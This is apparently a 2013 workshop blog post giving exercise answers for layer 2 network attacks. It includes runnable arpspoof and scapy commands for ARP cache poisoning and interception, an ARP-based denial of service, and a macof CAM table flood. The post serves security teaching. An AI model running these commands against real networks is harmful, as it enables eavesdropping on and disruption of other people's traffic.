---
title: 'Security Workshop #1 Layer 2 Security Part. 1'
date: 2013-02-18T00:02:48+00:00
author: burningnode
layout: post
categories: courses
tags:
  - courses
  - ios
  - linux
  - security
  - switching
draft: false
---

Introduction to layer 2 security, part 1.  
&#8211; Layer 2 Switching &#8211; Sniffing tools &#8211; Exercise 0  
&#8211; Attack 1: ARP spoofing &#8211; Exercise 1 &#8211; Counter 1  
&#8211; Attack 2: CAM table overflow &#8211; Exercise 2 &#8211; Counter 2



**Slides**

[Layer 2 - Security - Part1](/Layer-2-Security-Part1.pdf )   


**Exercise/Answers**

Exercise 1.1

```
## Set a static IP address (Debian)

ifconfig eth0 192.168.1.5 netmask 255.255.255.0 (not reboot persistent)

## or 

nano /etc/interfaces
auto eth0
iface eth0 inet static
address 192.168.1.5
network 192.168.1.0
netmask 255.255.255.0
broadcast 192.168.1.255

## Activate routing 

echo 1 &gt; /proc/sys/net/ipv4/ip_forward (not reboot persistent)

## or 

nano /etc/sysctl.conf
net.ipv4.ip_forward = 1

sysctl -p

## Send ARP request with arpspoof

arpspoof -i eth0 -t 192.168.1.2 192.168.1.3
arpspoof -i eth0 -t 192.168.1.3 192.168.1.2

## Observe with Wireshark or tcpdump
```



Exercise 1.2

```
## Victim's IP: 192.168.1.5
## Attacker's MAC: 11:11:11:11:11:11
## Victim's MAC: 22:22:22:22:22:22
## Gateway IP: 192.168.1.1
## Gateway MAC: 33:33:33:33:33:33

## Activate routing
echo 1 &gt; /proc/sys/net/ipv4/ip_forward

## ARP messages sent to victim
target = ARP()
target.hwsrc="11:11:11:11:11:11"
target.psrc="192.168.1.1"
target.hwdst="22:22:22:22:22:22"
target.pdst="192.168.1.5"
target.display() 
send(target, count=2000) 

## ARP messages sent to the gateway
gw = ARP()
gw.hwsrc="11:11:11:11:11:11"
gw.psrc="192.168.1.5"
gw.hwdst="33:33:33:33:33:33"
gw.pdst="192.168.1.1"
gw.display() 
send(gw, count=2000) 

## Use Wireshark to wiretap

## On scapy, there is also a function arpcachepoison().

## http://samsclass.info/124/proj11/proj9x-106-arpspoof.html
## http://scapy-guide.googlecode.com/files/ScapyGuide.pdf
```



Exercise 1.3

```
## The answer is in arpspoof manpage
## -t target 	Specify a particular host to ARP poison (if not specified, all hosts on the LAN). 
## http://www.irongeek.com/i.php?page=backtrack-3-man/arpspoof
## Send gratuitous ARP frames

arpspoof -i eth0 192.168.1.1

## The objective is a denial of service, so we do not route packets
echo 0 &gt; /proc/sys/net/ipv4/ip_forward
```



Exercise 2.1

```
## Use macof
## Interface eth0, 8K requests
## http://www.irongeek.com/i.php?page=backtrack-3-man/macof

macof -i eth0 -n 8000

## We can also easily do a CAM table overflow with scapy.
```



_The purpose of this article/presentation is informational only. The author is not and could not be held responsible for the readers&#8217; behavior._